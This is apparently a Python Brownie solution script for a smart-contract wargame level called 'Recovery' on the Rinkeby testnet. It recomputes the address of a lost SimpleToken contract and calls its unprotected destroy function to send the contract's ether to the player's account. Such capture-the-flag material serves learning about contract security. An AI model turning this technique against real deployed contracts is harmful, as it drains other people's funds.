from brownie import accounts, config, SimpleToken, Recovery
from web3 import Web3

# load account
account = accounts.load("Rinkeby_Test_Net_Account")
# get instance
instance_address = "0x4d7fC810F4B6265Da68249495C563e46b709E61A"
recovery = Recovery.at(instance_address)

# set variables
eth_amount = Web3.toWei("0.001", "ether")
my_balance = account.balance()
new_balance = 0
zero = "0x"

# --------------------------------------------------------
# This level will be completed if you can recover
# (or remove) the 0.5 ether from the lost contract address.
# --------------------------------------------------------


def level_completed():
    return code == zero


def exploit():
    # compute address
    hash = Web3.solidityKeccak(
        ["bytes", "bytes", "address", "bytes"],
        ["0xd6", "0x94", instance_address, "0x01"],
    )
    hash_hex = Web3.toHex(hash)
    address = "0x" + hash_hex[-40:]
    print(f"Address is: {address}")

    # get the simple token contract that was lost
    simple_token = SimpleToken.at(address)

    # call destroy and send ether to our address
    tx = simple_token.destroy(account.address, {"from": account})
    tx.wait(1)

    # set up web3
    rpc_url = config["wallets"]["endpoint"]
    w3 = Web3(Web3.HTTPProvider(rpc_url))

    # get bytecode of contract
    global code
    code_bytes = w3.eth.get_code(simple_token.address)
    code = Web3.toHex(code_bytes)

    # confrim we have completed the level
    print(f"Level has been completed: {level_completed()}")


def main():
    exploit()
